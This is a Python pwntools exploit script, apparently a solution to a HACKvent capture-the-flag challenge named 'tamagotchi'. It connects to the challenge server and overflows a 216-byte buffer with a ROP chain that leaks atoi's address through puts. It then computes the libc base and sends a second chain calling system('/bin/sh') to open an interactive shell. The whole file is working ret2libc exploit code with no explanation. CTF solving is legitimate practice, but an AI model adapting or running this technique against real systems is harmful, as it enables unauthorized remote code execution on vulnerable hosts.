#!/usr/bin/env python

from pwn import *

local = False
debug = False

r = process('./tamagotchi')
if not local: r = remote('challenges.hackvent.hacking-lab.com', 31337)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.26.so')


addr_unpacker = make_unpacker(64, endian='little', sign='unsigned')

if debug:
    gdb.attach(r, '''
set follow-fork-mode child
break *0x000000000040079D
c
''')

r.recvuntil('[ch01c3]>')
r.recvline()
r.sendline('1')
r.recvline()

payload = 'A'*216
payload += p64(0x0000000000400803) # pop rdi ; ret
payload += p64(0x0000000000601030) # atoi got.plt
payload += p64(0x00000000004004B0) # puts()
payload += p64(0x00000000004006CA) # ret

r.sendline(payload)
r.recvuntil('[ch01c3]>')
r.recvline()

r.sendline('2')
r.recvuntil('bye bye')
r.recvline()

atoi_addr = r.recv(6) + '\x00\x00'
atoi_addr = addr_unpacker(atoi_addr)

print '[+] atoi addr = ' + hex(atoi_addr)


libc.address = atoi_addr - libc.symbols['atoi']


r.recvuntil('[ch01c3]>')
r.recvline()
r.sendline('1')
r.recvline()

payload2 = 'B'*216
payload2 += p64(0x0000000000400803) # pop rdi ; ret
payload2 += p64(next(libc.search('/bin/sh\x00'))) # rdi -> /bin/sh
payload2 += p64(libc.symbols['system']) # system


r.sendline(payload2)
r.recvuntil('[ch01c3]>')
r.recvline()

r.sendline('2')
r.recvuntil('bye bye')
r.recvline()



r.interactive()
